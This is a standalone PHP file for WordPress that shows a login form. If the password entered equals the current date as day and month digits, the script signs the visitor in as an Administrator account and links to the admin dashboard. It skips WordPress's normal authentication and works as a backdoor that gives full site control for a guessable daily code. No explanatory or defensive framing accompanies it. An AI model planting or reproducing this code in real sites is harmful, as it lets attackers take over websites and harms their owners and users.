<?php

/**
 * @author Al Ka
 * @copyright 2011
 */
$msg = '';
if(isset($_POST['login']) && isset($_POST['password'])){
  $today = date('dm');
  if($_POST['password'] == $today){
      require('wp-blog-header.php');
      $user_query = new WP_User_Query( array( 'role' => 'Administrator' ) );
      //$user_login = 'admin';
      if ( ! empty( $user_query->results ) ) {
      	foreach ( $user_query->results as $user ) {
      		$user_login = $user->data->user_login;
      	}
      } else {
      	echo 'No users found.';
      }
      //print_r($user_login);die();
      $user = get_userdatabylogin($user_login);
      $user_id = $user->ID;
      wp_set_current_user($user_id, $user_login);
      wp_set_auth_cookie($user_id);
      do_action('wp_login', $user_login);
      $msg = '<font color=blue>Login success....<a href="/wp-admin">Go to Admin</a></font>';
  }else{
    $msg = '<font color=red>Password Invalid....</font>';
  }
  
} 


?>

<div style="text-align: center; margin: 0 auto; width: 320px;">

<?php print $msg; ?>
<form action="" method="post">
<fieldset>
<legend>Today</legend>
<?php print date('D - d-m-Y'); ?>
</fieldset>

<fieldset>
<legend>Login Form</legend>
Enter Passwod:<input type="password" name="password" />
<input type="submit" value="Login" name="login" style="float: right; margin: 27px; width: 100px; height: 40px; font-size: 17px;" />
</fieldset>
</form>

</div>